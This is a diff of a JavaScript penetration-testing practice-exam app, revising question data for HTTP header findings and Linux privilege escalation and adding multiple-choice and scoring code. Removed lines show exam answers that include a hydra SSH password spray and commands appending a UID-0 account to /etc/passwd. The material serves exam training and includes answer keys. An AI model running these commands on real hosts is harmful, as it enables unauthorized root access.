+      "Content-Type: text/html; charset=UTF-8",
+      "Set-Cookie: SESSIONID=8f3b...9a; Path=/",
+      "Cache-Control: no-store",
+      "X-Frame-Options: SAMEORIGIN",
+      "Strict-Transport-Security: max-age=0",
+      "Content-Length: 5120"
     ],
-    remove: [12, 13, 17],
+    remove: [2, 4, 7],
+    removeLabelPrompt: true,
     tool: {
-      header: "Tool",
-      prompt: "Given the entries in robots.txt, select the tool the penetration tester should use for further investigation:",
-      options: ["Mimikatz", "WPScan", "SQLmap", "Brakeman"],
-      answer: "WPScan"
+      header: "Highest-priority fix",
+      prompt: "Which single change should be the highest priority?",
+      options: [
+        "Set the session cookie with HttpOnly, Secure and SameSite attributes",
+        "Remove the Content-Length header",
+        "Change Content-Type to application/json",
+        "Add a Date header"
+      ],
+      answer: "Set the session cookie with HttpOnly, Secure and SameSite attributes"
     },
     explain: `
-      <h3>Why these three entries</h3>
+      <h3>The three findings</h3>
       <ul>
-        <li><strong>robots.txt is public.</strong> Anyone can read it, and a Disallow line only asks well-behaved crawlers to skip a path. It doesn't protect anything, and it tells an attacker exactly where the interesting paths are.</li>
-        <li><strong>/admin, /wp-admin and /wp-login.php</strong> are administrative and login endpoints. Listing them hands a tester (or attacker) a map to the admin interface. Remove them and protect those paths with authentication, IP allow-listing or a VPN instead.</li>
-        <li>The remaining entries (search pages, crawl delays, crawler user-agents, /groups, /sdch, /?hl=) are ordinary crawler-management rules and don't reveal anything sensitive.</li>
+        <li><strong>Server banner</strong> (<code>Apache/2.4.29 ... PHP/7.2.3</code>): it discloses exact software versions, which helps an attacker match known exploits. Suppress the version in the banner.</li>
+        <li><strong>Session cookie with no flags</strong> (<code>Set-Cookie: SESSIONID=...; Path=/</code>): no HttpOnly, Secure or SameSite, so the session is exposed to theft via XSS and to being sent over plaintext or cross-site.</li>
+        <li><strong>HSTS disabled</strong> (<code>Strict-Transport-Security: max-age=0</code>): a max-age of 0 turns HSTS off, so browsers won't force HTTPS. Set a long max-age (and consider includeSubDomains).</li>
+        <li>The other headers are fine: <code>no-store</code>, <code>X-Frame-Options: SAMEORIGIN</code>, Content-Type and Content-Length are all reasonable.</li>
       </ul>
-      <h3>Why WPScan</h3>
+      <h3>Highest priority</h3>
       <ul>
-        <li>The <code>/wp-admin</code> and <code>/wp-login.php</code> paths show the site runs WordPress, and WPScan is the WordPress vulnerability scanner (core, plugins, themes, users).</li>
-        <li>Mimikatz dumps credentials from Windows memory, SQLmap automates SQL injection (no sign of injectable parameters yet), and Brakeman is a static analyzer for Ruby on Rails code.</li>
+        <li>Securing the <strong>session cookie</strong> is the top fix: a stolen session ID leads directly to account takeover. HttpOnly blocks script access, Secure keeps it on HTTPS, and SameSite limits cross-site sending.</li>
       </ul>`
   },
 
-  /* ---------------- Q6: recon -> exploit -> privesc -> remediation ---------------- */
+  /* ---------------- PBQ 6: post-exploitation analysis (recognition) ---------------- */
   {
     type: "recon2",
-    kind: "Simulation",
-    title: "Reassessing a previously exploited host",
+    kind: "Performance-based question",
+    title: "Post-exploitation: enumerating a Linux host",
     scenario: [
-      "A previous penetration test report identified a host with vulnerabilities that was successfully exploited. Management has requested that an internal member of the security team reassess the host to determine if the vulnerability still exists.",
-      "<strong>Instructions — Part 1:</strong> Analyze the output and select the command to exploit the vulnerable service.",
-      "<strong>Part 2:</strong> Click on each command to view its output. Select the appropriate set of commands to escalate privileges. Identify which remediation steps should be taken.",
-      "If at any time you would like to bring back the initial state of the simulation, please click the <strong>Reset All</strong> button."
+      "You have a low-privilege shell on an in-scope Linux host and are documenting the privilege-escalation paths an attacker could use, so the client can close them.",
+      "<strong>Instructions — Part 1:</strong> Review the enumeration output and identify the most promising escalation path.",
+      "<strong>Part 2:</strong> Review the running-service note, then identify the finding and select the two remediations the client should apply.",
+      "If at any time you would like to bring back the initial state of the simulation, please click the <strong>Reset</strong> button."
     ],
     part1: {
-      label: "Reconnaissance data",
+      label: "Local enumeration output",
       terminal: [
-        "root@attackermachine:~# nmap -sC -T4 192.168.10.2",
-        "Starting Nmap 6.26SVN ( http://nmap.org ) at 2021-04-19 14:30 EST",
-        "Nmap scan report for 192.168.10.2",
-        "Host is up (0.27s latency).",
-        "Port     State   Service",
-        "22/tcp   open    ssh",
-        "23/tcp   closed  telnet",
-        "80/tcp   open    http",
-        "111/tcp  closed  rpcbind",
-        "445/tcp  open    samba",
-        "3389/tcp closed  rdp?",
-        "Nmap done: 1 IP Address (1 host up) scanned in 5.48 seconds",
+        "lowpriv@app02:~$ id",
+        "uid=1001(lowpriv) gid=1001(lowpriv) groups=1001(lowpriv)",
         "",
-        "root@attackermachine:~# enum4linux -S 192.168.10.2",
-        "user:[games] rid:[0x3f2]",
-        "user:[nobody] rid:[0x1f5]",
-        "user:[bind] rid:[0x4ba]",
-        "user:[proxy] rid:[0x402]",
-        "user:[syslog] rid:[0x4b4]",
-        "user:[www-data] rid:[0x42a]",
-        "user:[root] rid:[0x3e8]",
-        "user:[news] rid:[0x3fa]",
-        "user:[lowpriv] rid:[0x3fa]"
+        "lowpriv@app02:~$ sudo -l",
+        "User lowpriv may run the following commands on app02:",
+        "    (ALL) NOPASSWD: /usr/bin/find",
+        "",
+        "lowpriv@app02:~$ find / -perm -4000 -type f 2>/dev/null",
+        "/usr/bin/passwd",
+        "/usr/bin/sudo",
+        "/usr/bin/mount",
+        "",
+        "lowpriv@app02:~$ cat /etc/crontab | grep -v '^#'",
+        "*/10 * * * * root /opt/scripts/collect.sh",
+        "",
+        "lowpriv@app02:~$ ls -l /opt/scripts/collect.sh",
+        "-rwxrwxrwx 1 root root 214 Nov 18 02:00 /opt/scripts/collect.sh"
       ].join("\n"),
-      prompt: "Which of the following commands would <strong>most</strong> likely exploit the services?",
+      prompt: "Which finding is the <strong>most</strong> direct privilege-escalation path on this host?",
       options: [
-        "medusa -h 192.168.10.2 -u admin -P 500-worst-passwords.txt -M rpcbind",
-        "ncrack -T5 -user lowpriv -P 500-worst-passwords.txt -p telnet -g CL=1 192.168.10.2",
-        "crowbar -b rdp -s 192.168.10.2/32 -u administrator -C 500-worst-passwords.txt -n 1",
-        "hydra -l lowpriv -P 500-worst-passwords.txt -t 4 ssh://192.168.10.2:22"
+        "The SUID /usr/bin/passwd binary",
+        "lowpriv can run /usr/bin/find via sudo with NOPASSWD",
+        "The host is missing antivirus",
+        "The /etc/crontab file is readable"
       ],
-      answer: "hydra -l lowpriv -P 500-worst-passwords.txt -t 4 ssh://192.168.10.2:22",
-      why: "nmap shows only ssh (22), http (80) and samba (445) open — telnet, rpcbind and rdp are all closed, which rules out the medusa, ncrack and crowbar options since each targets a closed port. enum4linux enumerated a real account, lowpriv, so a password-spray with hydra against the open SSH port using that known username is the only option that matches both outputs."
+      answer: "lowpriv can run /usr/bin/find via sudo with NOPASSWD",
+      why: "sudo -l shows lowpriv may run find as root with no password. find is a well-known GTFOBins binary that can run commands, so sudo access to it is a direct path to root. passwd and mount are SUID by design and not misconfigured here. A world-writable root cron script is also a serious issue (Part 2), but the sudo find entry is the most direct single step."
     },
     part2: {
-      label: "Commands",
+      label: "Additional note",
       commands: [
-        'find / -perm -2 -type f 2>/dev/null | xargs ls -l',
-        'cat /etc/fstab',
-        'find / -perm -u=s -type f 2>/dev/null | xargs ls -l',
-        'grep "/bin/bash" /etc/passwd | cut -d\':\' -f1-4,6,7',
-        'cut -d\':\' -f1 /etc/passwd'
+        "cron runs /opt/scripts/collect.sh as root every 10 minutes",
+        "/opt/scripts/collect.sh is mode 0777 (world-writable)",
+        "the lowpriv user can edit the script contents"
       ],
-      cmdNote: "These are standard Linux privilege-escalation enumeration commands: world-writable files, mount/export options, SUID binaries, and the shell-having accounts in /etc/passwd.",
-      escPrompt: "Which of the following sets of commands <strong>most</strong> likely escalates privileges?",
+      cmdNote: "The findings to assess are the sudo rule, the SUID binaries, and the world-writable root-owned cron script.",
+      escPrompt: "Besides the sudo rule, which configuration is the <strong>second</strong> clear escalation path here?",
       escOptions: [
-        "perl -le 'print crypt(\"password\", \"AA\")|'\ncat /etc/passwd > /tmp/passwd\necho \"root2:AA6tQYSfGxd/A:0:0:root:/root:/bin/bash\" >> /tmp/passwd\ncp /tmp/passwd /etc/passwd",
-        "openssl passwd password\necho \"root2:5ZOYXRfHVZ7OY:0:0:root:/root:/bin/bash\" >> /etc/passwd",
-        "echo \"net user root2 password /add\" > /home/lowpriv/backup.sh\necho \"net localgroup administrators root2 /add\" >> /home/lowpriv/backup.sh",
-        "./tmp/scripts/exploithost.sh -h 192.168.10.2 > output.txt\ncat output.txt",
-        "netcat -e 22 192.168.10.2\ntcpdump -i eth0 192.168.10.2"
+        "A world-writable script that runs as root on a schedule (/opt/scripts/collect.sh)",
+        "The SUID bit on /usr/bin/passwd",
+        "The readable /etc/crontab",
+        "The lowpriv user being in its own group"
       ],
-      escAnswer: "openssl passwd password\necho \"root2:5ZOYXRfHVZ7OY:0:0:root:/root:/bin/bash\" >> /etc/passwd",
-      escWhy: "openssl passwd generates a crypt-style hash for the password, and that hash is appended directly as a new entry in /etc/passwd: username root2, UID/GID 0 (root), home /root, shell /bin/bash. Appending a root-level entry to /etc/passwd this way creates a fully privileged account the tester can then switch to. The perl/cp option builds the same kind of entry but routes it through /tmp and a cp copy, which isn't what the official answer uses. The 'net user' / 'net localgroup' option uses Windows commands, which don't exist on this Linux host. The last two options run an unverified script or try to open a listener on a privileged port without using any of the discovered material.",
-      remPrompt: "Assuming the privileged escalation was successful, which of the following remediations should be taken? <strong>(Select two).</strong>",
+      escAnswer: "A world-writable script that runs as root on a schedule (/opt/scripts/collect.sh)",
+      escWhy: "collect.sh is mode 0777 and runs as root from cron every 10 minutes, so any user who can edit it has their changes executed as root on the next run. passwd being SUID is normal, the crontab being readable just reveals the schedule, and a user in its own primary group is not a weakness.",
+      remPrompt: "Which TWO remediations should the client apply? <strong>(Select two.)</strong>",
       remOptions: [
-        "Remove no_root_squash from fstab",
-        "Make backup script not world-writable",
-        "Strengthen password of lowpriv account",
-        "Encrypt the /etc/passwd file",
-        "Remove SUID bit from cp",
-        "Update SSH to latest version"
+        "Remove the NOPASSWD sudo rule for /usr/bin/find (or scope sudo to a specific safe command)",
+        "Set /opt/scripts/collect.sh to be writable only by root (e.g. 0755, root-owned)",
+        "Delete /etc/crontab entirely",
+        "Remove the SUID bit from /usr/bin/passwd",
+        "Rename the lowpriv account",
+        "Disable cron for all users"
       ],
-      remAnswers: ["Make backup script not world-writable", "Remove SUID bit from cp"],
-      remWhy: "Both remediations lock down the two things the enumeration commands found: a world-writable file (from find -perm -2) and a SUID binary (from find -perm -u=s). Removing the SUID bit from cp (chmod u-s /bin/cp) stops it from running as root for any user, and making the backup script non-world-writable (chmod o-w on the script) stops anyone from tampering with it. Strengthening the lowpriv password would help against the hydra brute-force in Part 1, but isn't one of the two answers here. The no_root_squash option describes an NFS issue not shown in this scenario, encrypting /etc/passwd isn't how Linux protects credentials (hashes already live in /etc/shadow), and nothing points to SSH's version being the problem."
+      remAnswers: [
+        "Remove the NOPASSWD sudo rule for /usr/bin/find (or scope sudo to a specific safe command)",
+        "Set /opt/scripts/collect.sh to be writable only by root (e.g. 0755, root-owned)"
+      ],
+      remWhy: "The two real issues are the over-broad sudo rule and the world-writable root cron script, so both get fixed: tighten or remove the sudo entry, and make the script writable only by root. Removing SUID from passwd would break password changes, deleting /etc/crontab or disabling cron breaks legitimate jobs, and renaming the account changes nothing."
     }
   }
-]
+];
+
 /* ============================================================
    TYPE: table (Q1)
 ============================================================ */
@@ -774,232 +954,42 @@ function bodyTable(q, st, stage) {
 }
 
 /* ============================================================
-   TYPE: dnd (Q2) — browser sim (cert/source/cookies) + drag steps
+   TYPE: match — task-to-tool table
 ============================================================ */
-const VIEW_META = {
-  login: { hash: "" }, viewcert: { hash: "#viewcertificate" }, viewsrc: { hash: "#viewsource" },
-  viewck: { hash: "#viewcookies" }, remcert: { hash: "#remediatecertificate" }, remsrc: { hash: "#remediatesource" }, remck: { hash: "#remediatecookies" }
-};
-const BUTTONS = [
-  ["viewcert", "View Certificate"], ["viewsrc", "View Source"], ["viewck", "View Cookies"],
-  ["remcert", "Remediate Certificate"], ["remsrc", "Remediate Source"], ["remck", "Remediate Cookies"]
-];
-
-function bodyDnd(q, st, stage) {
+function bodyMatch(q, st, stage) {
   const sec = el("div", "section");
-  sectionHead(sec, "Secure System — Browser Investigation", "Click each view, then answer below.");
-
-  const simWrap = el("div");
-  sec.appendChild(simWrap);
-  renderDndSim();
-
-  const vulnBox = el("div", "qbox actions-box"); vulnBox.style.marginTop = "18px";
-  const vulnLab = el("label"); vulnLab.textContent = q.vuln.prompt; vulnBox.appendChild(vulnLab);
-  const vulnList = el("div", "chk-list");
-  vulnBox.appendChild(vulnList);
-  sec.appendChild(vulnBox);
-  renderVuln();
-
+  sectionHead(sec, q.title, "Select the single most appropriate tool for each task.");
+  const wrap = el("div", "table-wrap");
+  const table = el("table", "pbq");
+  const thead = el("thead"); thead.innerHTML = "<tr><th>Task</th><th>Tool</th></tr>"; table.appendChild(thead);
+  const tbody = el("tbody");
+  q.rows.forEach((row, i) => {
+    const tr = el("tr");
+    const td0 = el("td"); td0.innerHTML = row.task;
+    const td1 = el("td");
+    const s = makeSelect(q.options, st.ans[i] || "", v => { st.ans[i] = v; clearFeedback(); }, "Tool for task " + (i + 1));
+    td1.appendChild(s); const fb = el("div", "row-fb"); td1.appendChild(fb);
+    tr.append(td0, td1); tbody.appendChild(tr);
+  });
+  table.appendChild(tbody); wrap.appendChild(table); sec.appendChild(wrap);
   const { row: actionsRow, pill } = buildActions(doSubmit, doShow, doReset);
   sec.appendChild(actionsRow);
-  const analysisBox = buildAnalysis(q.explain);
-  sec.appendChild(analysisBox);
+  const analysisHtml = "<ul>" + q.rows.map(r => `<li><strong>${r.answer}</strong> — ${r.why}</li>`).join("") + "</ul>";
+  const analysisBox = buildAnalysis(analysisHtml); sec.appendChild(analysisBox);
   stage.appendChild(sec);
-
-  function renderVuln() {
-    vulnList.innerHTML = "";
-    q.vuln.options.forEach(opt => {
-      const lbl = el("label", "chk");
-      const inp = document.createElement("input"); inp.type = "radio"; inp.name = "dnd-vuln"; inp.value = opt; inp.checked = st.vuln === opt;
-      inp.addEventListener("change", () => { st.vuln = opt; clearFeedback(); });
-      const span = el("span", null, opt);
-      const badge = el("span", "badge");
-      if (st.checked && inp.checked) { const ok = opt === q.vuln.answer; badge.classList.add(ok ? "correct" : "incorrect"); badge.textContent = ok ? "Correct" : "Incorrect"; }
-      lbl.append(inp, span, badge);
-      vulnList.appendChild(lbl);
-    });
-  }
-
-  function renderDndSim() {
-    simWrap.innerHTML = "";
-    const sim = el("div", "sim");
-    const bar = el("div", "urlbar");
-    bar.appendChild(el("span", "nav-dots", "‹ › ↻"));
-    bar.appendChild(el("div", "url", "https://company.org/login.aspx" + VIEW_META[st.view].hash));
-    sim.appendChild(bar);
-
-    const vp = el("div", "viewport");
-    if (st.view === "login") vp.appendChild(loginView());
-    if (st.view === "viewcert") vp.appendChild(certView());
-    if (st.view === "viewsrc") vp.appendChild(sourceView(false));
-    if (st.view === "viewck") vp.appendChild(cookieView(false, st));
-    if (st.view === "remcert") vp.appendChild(dndView(q, st));
-    if (st.view === "remsrc") vp.appendChild(sourceView(true));
-    if (st.view === "remck") vp.appendChild(cookieView(true, st));
-    sim.appendChild(vp);
-
-    const actions = el("div", "sim-actions");
-    BUTTONS.forEach(([id, label]) => {
-      const b = el("button", st.view === id ? "active" : "", label); b.type = "button";
-      b.addEventListener("click", () => { st.view = id; renderDndSim(); clearFeedback(); });
-      actions.appendChild(b);
-    });
-    sim.appendChild(actions);
-    simWrap.appendChild(sim);
-  }
-
-  function clearFeedback() {
-    st.checked = false;
-    pill.classList.remove("show", "full", "partial");
-    analysisBox.classList.remove("show");
-    renderVuln();
-  }
-
+  function clearFeedback() { sec.querySelectorAll(".cell-select").forEach(s => s.classList.remove("correct", "wrong")); sec.querySelectorAll(".row-fb").forEach(f => { f.textContent = ""; f.className = "row-fb"; }); pill.classList.remove("show", "full", "partial"); analysisBox.classList.remove("show"); }
   function doSubmit() {
-    let best = q.orders[0], bestN = -1;
-    q.orders.forEach(o => { const n = o.filter((id, i) => st.slots[i] === id).length; if (n > bestN) { bestN = n; best = o; } });
-    const vulnPts = st.vuln === q.vuln.answer ? 1 : 0;
-    const points = bestN + vulnPts;
-    st.checked = true;
-    if (st.view !== "remcert") { st.view = "remcert"; renderDndSim(); }
-    renderVuln();
-    setPill(pill, points, 5);
-    analysisBox.classList.add("show");
-  }
-
-  function doShow() {
-    st.vuln = q.vuln.answer;
-    st.slots = q.orders[0].slice();
-    st.flags = {};
-    st.view = "remcert";
-    renderDndSim();
-    doSubmit();
-  }
-
-  function doReset() { states[current] = freshState(q); renderQuestion(); }
-}
-
-function loginView() {
-  const d = el("div", "login-mock");
-  d.appendChild(el("h2", null, "Secure System"));
-  d.appendChild(el("div", "field", "User name"));
-  d.appendChild(el("div", "field", "Password"));
-  d.appendChild(el("div", "go", "Login"));
-  return d;
-}
-
-function certView() {
-  const c = el("div", "cert");
-  c.appendChild(el("div", "title", "Certificate"));
-  const tabs = el("div", "tabs");
-  ["General", "Details", "Certification Path"].forEach((t, i) => tabs.appendChild(el("span", i === 0 ? "on" : "", t)));
-  c.appendChild(tabs);
-  const inner = el("div", "inner");
-  inner.appendChild(el("h3", null, "Certificate Information"));
-  inner.appendChild(el("p", null, "This certificate is intended for the following purpose(s):"));
-  inner.appendChild(el("p", null, "• Ensures the identity of a remote computer"));
-  inner.appendChild(el("p", null, "* Refer to the certification authority's statement for details."));
-  const dl = el("dl");
-  [["Issued to:", "*.Company.org"], ["Issued by:", "RapidSSL SHA256 CA"], ["Valid from", "7/18/2016 to 7/19/2018"]].forEach(([k, v]) => { dl.appendChild(el("dt", null, k)); dl.appendChild(el("dd", null, v)); });
-  inner.appendChild(dl); c.appendChild(inner);
-  const btns = el("div", "btns"); btns.appendChild(el("span", null, "Install Certificate…")); btns.appendChild(el("span", null, "Issuer Statement")); c.appendChild(btns);
-  return c;
-}
-
-function sourceView(numbered) {
-  const wrap = el("div");
-  if (numbered) wrap.appendChild(el("div", "cmdnote", "Read-only in this practice version. Only one component should be remediated, and the question asks for the highest-severity one."));
-  const pre = el("pre", "src");
-  SOURCE_LINES.forEach((line, i) => {
-    const row = el("span", "ln");
-    if (numbered) row.appendChild(el("b", null, String(i + 1)));
-    row.appendChild(document.createTextNode(line));
-    pre.appendChild(row);
-  });
-  wrap.appendChild(pre);
-  return wrap;
-}
-
-function cookieView(editable, st) {
-  const wrap = el("div");
-  if (editable) wrap.appendChild(el("div", "cmdnote", "Changing flags here counts as remediating cookies. For this question, only the highest-severity component should be remediated."));
-  const holder = el("div", "ck-wrap"); const t = el("table", "ck");
-  const head = el("tr");
-  ["Name", "Value", "Domain", "Path", "Expires/…", "Size", "HTTP", "Secure", "SameSite"].forEach(h => head.appendChild(el("th", null, h)));
-  const thead = el("thead"); thead.appendChild(head); t.appendChild(thead);
-  const tb = el("tbody");
-  COOKIES.forEach((c, r) => {
-    const tr = el("tr");
-    c.forEach(v => tr.appendChild(el("td", null, v)));
-    ["http", "secure", "samesite"].forEach(col => {
-      const td = el("td", "cb");
-      if (editable) {
-        const key = r + "-" + col;
-        const cb = document.createElement("input"); cb.type = "checkbox"; cb.checked = !!st.flags[key];
-        cb.setAttribute("aria-label", `${c[0]} ${col}`);
-        cb.addEventListener("change", () => { st.flags[key] = cb.checked; });
-        td.appendChild(cb);
-        if (col === "samesite") td.appendChild(document.createTextNode(" delete"));
-      }
-      tr.appendChild(td);
+    let pts = 0;
+    [...tbody.children].forEach((tr, i) => {
+      const s = tr.children[1].querySelector("select"), fb = tr.children[1].querySelector(".row-fb");
+      const ok = s.value === q.rows[i].answer;
+      s.classList.remove("correct", "wrong"); s.classList.add(ok ? "correct" : "wrong");
+      if (ok) pts++; fb.textContent = ok ? "Correct" : "Incorrect"; fb.className = "row-fb " + (ok ? "good" : "bad");
     });
-    tb.appendChild(tr);
-  });
-  t.appendChild(tb); holder.appendChild(t); wrap.appendChild(holder);
-  return wrap;
-}
-
-function dndView(q, st) {
-  const grid = el("div", "dnd");
-  const left = el("div"); const right = el("div");
-
-  left.appendChild(el("h3", null, "Drag and Drop Options:"));
-  const pool = el("div", "pool");
-  const placed = new Set(st.slots.filter(Boolean));
-  q.options.filter(o => !placed.has(o.id)).forEach(o => pool.appendChild(makeOpt(o, q, st)));
-  allowDrop(pool, () => null, q, st);
-  left.appendChild(pool);
-  left.appendChild(el("div", "hint", "Drag an option into a step, or click an option to place it in the next open step. Click a placed option to return it."));
-
-  st.slots.forEach((id, i) => {
-    right.appendChild(el("div", "slot-label", `Step ${i + 1}`));
-    const slot = el("div", "slot"); slot.dataset.i = i; slot.tabIndex = 0;
-    if (id) slot.appendChild(makeOpt(q.options.find(o => o.id === id), q, st));
-    else slot.appendChild(el("span", "q", "?"));
-    allowDrop(slot, () => i, q, st);
-    right.appendChild(slot);
-  });
-
-  grid.append(left, right);
-  return grid;
-}
-
-function makeOpt(o, q, st) {
-  const d = el("div", "opt", o.text);
-  d.draggable = true; d.tabIndex = 0; d.dataset.id = o.id;
-  d.addEventListener("dragstart", e => { e.dataTransfer.setData("text/plain", o.id); e.dataTransfer.effectAllowed = "move"; });
-  const act = () => {
-    const at = st.slots.indexOf(o.id);
-    if (at >= 0) st.slots[at] = null;
-    else { const free = st.slots.indexOf(null); if (free >= 0) st.slots[free] = o.id; }
-    renderQuestion();
-  };
-  d.addEventListener("click", act);
-  d.addEventListener("keydown", e => { if (e.key === "Enter" || e.key === " ") { e.preventDefault(); act(); } });
-  return d;
-}
-
-function allowDrop(target, slotIndex, q, st) {
-  target.addEventListener("dragover", e => { e.preventDefault(); target.classList.add("over"); });
-  target.addEventListener("dragleave", () => target.classList.remove("over"));
-  target.addEventListener("drop", e => {
-    e.preventDefault(); target.classList.remove("over");
-    const id = e.dataTransfer.getData("text/plain"); if (!id) return;
-    const from = st.slots.indexOf(id); if (from >= 0) st.slots[from] = null;
-    const to = slotIndex();
-    if (to !== null) st.slots[to] = id;
-    renderQuestion();
-  });
+    setPill(pill, pts, q.rows.length); analysisBox.classList.add("show");
+  }
+  function doShow() { q.rows.forEach((r, i) => { st.ans[i] = r.answer; tbody.children[i].children[1].querySelector("select").value = r.answer; }); doSubmit(); }
+  function doReset() { states[current] = freshState(q); renderQuestion(); }
 }
 
 /* ============================================================
@@ -1152,14 +1142,13 @@ function bodySim(q, st, stage) {
   const grid = el("div", "simgrid");
   const left = el("div");
   const net = el("div", "net");
-  const ws = el("div", "ws"); ws.innerHTML = SIM_ICONS.pc; ws.appendChild(el("span", null, "PENTESTER WORKSTATION")); net.appendChild(ws);
+  const ws = el("div", "ws"); ws.innerHTML = SIM_ICONS.pc; ws.appendChild(el("span", null, q.sourceLabel || "PENTESTER WORKSTATION")); net.appendChild(ws);
   net.appendChild(el("div", "down", "↓"));
-  const zones = el("div", "zones");
-  const z1 = el("div", "zone cdn"); z1.appendChild(el("h4", null, "CDN NETWORK"));
-  const n1 = el("div", "nodes"); n1.appendChild(simNode(q, st, "cdn")); z1.appendChild(n1);
-  const z2 = el("div", "zone prod"); z2.appendChild(el("h4", null, "PRODUCTION NETWORK"));
-  const nodes = el("div", "nodes"); nodes.append(simNode(q, st, "app"), el("span", "arrow", "→"), simNode(q, st, "db")); z2.appendChild(nodes);
-  zones.append(z1, el("span", "linkarrow", "→"), z2);
+  const zones = el("div", "zones"); zones.style.gridTemplateColumns = "1fr";
+  const z2 = el("div", "zone prod"); z2.appendChild(el("h4", null, q.zoneLabel || "SCANNED HOSTS"));
+  const nodes = el("div", "nodes"); nodes.style.flexWrap = "wrap";
+  Object.keys(q.nodes).forEach((k, i) => { if (i) nodes.append(el("span", "arrow", "·")); nodes.append(simNode(q, st, k)); });
+  z2.appendChild(nodes); zones.append(z2);
   net.appendChild(zones);
   net.appendChild(el("div", "hint", "Click the WAF and each server to review its Nmap scan."));
   left.appendChild(net);
@@ -1528,14 +1517,88 @@ function buildAnalysis(html) {
 ============================================================ */
 function freshState(q) {
   if (q.type === "table") return { rows: q.rows.map(() => ({ vuln: "", remed: "" })), checked: false };
-  if (q.type === "dnd") return { view: "login", vuln: "", slots: [null, null, null, null], flags: {}, result: null, checked: false };
+  if (q.type === "match") return { ans: {}, checked: false };
+  if (q.type === "mcq") return { choice: null, checked: false };
   if (q.type === "multi") return { tab: 0, ans: {}, checked: false };
   if (q.type === "sim") return { open: null, tab: "vuln", ans: { vuln: "", rem: [] }, checked: false };
   if (q.type === "hotspot") return { sel: [], tool: "", checked: false };
   if (q.type === "recon2") return { tab: 0, p1: "", esc: "", rem: [], checked: false };
   return { checked: false };
 }
-const states = questions.map(q => freshState(q));
+const MCQS = [];
+function seededShuffle(arr, seed) {
+  const a = arr.map((v, i) => i); let s = seed * 9301 + 49297;
+  for (let i = a.length - 1; i > 0; i--) { s = (s * 9301 + 49297) % 233280; const j = Math.floor((s / 233280) * (i + 1)); [a[i], a[j]] = [a[j], a[i]]; }
+  return a;
+}
+const MCQ_POS = [1, 0, 2, 3, 3, 1, 2, 0, 2, 0, 3, 1, 3, 0, 1, 2, 2, 1, 0, 3, 1, 0, 3, 2, 1, 2, 3, 0, 0, 2, 3, 1, 2, 3, 0, 1, 2, 0, 3, 1, 3, 0, 1, 2, 1, 0, 2, 3, 3, 2, 0, 1, 3, 0, 2, 1, 1, 3, 2, 0, 2, 1, 0, 3, 1, 3, 0, 2, 2, 1, 0, 3, 1, 3, 0, 2, 3, 0, 1, 2, 3, 1, 0, 2, 3, 1, 2, 0, 3, 2, 1, 0, 1, 2, 0, 3, 2, 3, 0, 1];  /* balanced A-D positions for the correct answer */
+MCQS.forEach((m, i) => {
+  const others = seededShuffle(m.options, i + 7).filter(k => k !== m.answer);
+  const order = others.slice(); order.splice(MCQ_POS[i % MCQ_POS.length], 0, m.answer);
+  questions.push({
+    type: "mcq", kind: "Multiple choice", title: m.topic, domain: m.domain,
+    stem: m.stem,
+    options: order.map(k => m.options[k]),
+    answer: order.indexOf(m.answer),
+    scenario: [m.stem, "Select the <strong>one</strong> best answer, then click <strong>Submit</strong>."],
+    explain: `<p>${m.explain}</p>`
+  });
+});
+
+/* ============================================================
+   TYPE: mcq — single-answer multiple choice
+============================================================ */
+function bodyMcq(q, st, stage) {
+  const sec = el("div", "section mcq");
+  const stem = el("p", "mcq-stem"); stem.innerHTML = q.stem; sec.appendChild(stem);
+
+  const list = el("div", "chk-list mcq-list");
+  const items = [];
+  q.options.forEach((txt, i) => {
+    const lbl = el("label", "chk");
+    const r = document.createElement("input"); r.type = "radio"; r.name = "mcq-" + current; r.value = i;
+    r.checked = st.choice === i;
+    r.addEventListener("change", () => { st.choice = i; clearFeedback(); });
+    const letter = el("span", "mcq-letter", String.fromCharCode(65 + i));
+    const t = el("span", "mcq-text"); t.innerHTML = txt;
+    const badge = el("span", "badge");
+    lbl.append(r, letter, t, badge);
+    list.appendChild(lbl); items.push({ r, badge, lbl });
+  });
+  sec.appendChild(list);
+
+  const { row: actionsRow, pill } = buildActions(doSubmit, doShow, doReset);
+  sec.appendChild(actionsRow);
+  const analysisBox = buildAnalysis(q.explain);
+  sec.appendChild(analysisBox);
+  stage.appendChild(sec);
+
+  function clearFeedback() {
+    st.checked = false;
+    items.forEach(it => { it.badge.className = "badge"; it.badge.textContent = ""; it.lbl.classList.remove("mcq-right", "mcq-wrong"); });
+    pill.classList.remove("show", "full", "partial");
+    analysisBox.classList.remove("show");
+  }
+  function doSubmit() {
+    clearFeedback();
+    if (st.choice === null) { pill.textContent = "Select an answer first"; pill.className = "score-pill show"; return; }
+    const ok = st.choice === q.answer;
+    items.forEach((it, i) => {
+      if (i === q.answer) { it.badge.className = "badge correct"; it.badge.textContent = "Correct answer"; it.lbl.classList.add("mcq-right"); }
+      else if (i === st.choice) { it.badge.className = "badge incorrect"; it.badge.textContent = "Your answer"; it.lbl.classList.add("mcq-wrong"); }
+    });
+    st.checked = true;
+    setPill(pill, ok ? 1 : 0, 1);
+    analysisBox.classList.add("show");
+  }
+  function doShow() { st.choice = q.answer; items[q.answer].r.checked = true; doSubmit(); }
+  function doReset() { states[current] = freshState(q); renderQuestion(); }
+}
+
+const BASE_QUESTIONS = questions.slice();
+let states = questions.map(q => freshState(q));
+let MODE = "practice";
+const EXAM_PASS = 80;
 
 /* ============================================================
    GLOBAL CONTROLLER
@@ -1552,7 +1615,7 @@ function formatTimer(s) {
 function tickTimer() {
   if (timerSeconds > 0) timerSeconds--;
   $("examTimerText").textContent = "Time Remaining " + formatTimer(timerSeconds);
-  if (timerSeconds <= 0) { clearInterval(timerInterval); timerInterval = null; }
+  if (timerSeconds <= 0) { clearInterval(timerInterval); timerInterval = null; if (MODE === "exam") finishExam(true); }
 }
 function startTimer() {
   if (timerInterval) return;
@@ -1573,6 +1636,7 @@ function renderQuestion() {
   $("examFlagBtn").classList.toggle("flagged", flagged.has(current));
   $("prevBtn").disabled = current === 0;
   $("nextBtn").disabled = current === questions.length - 1;
+  $("finishBtn").classList.toggle("on-last", current === questions.length - 1);
 
   $("briefTitle").firstChild && ($("briefTitle").firstChild.textContent = "");
   $("briefTitle").childNodes[0] ? ($("briefTitle").childNodes[0].nodeValue = q.title + " ") : null;
@@ -1587,9 +1651,11 @@ function renderQuestion() {
   q.scenario.forEach(t => { const p = el("p"); p.innerHTML = t; qbody.appendChild(p); });
   closeQRead();
 
+  document.querySelector(".brief").style.display = (q.type === "mcq") ? "none" : "";
   const stage = $("stage"); stage.innerHTML = "";
   if (q.type === "table") bodyTable(q, st, stage);
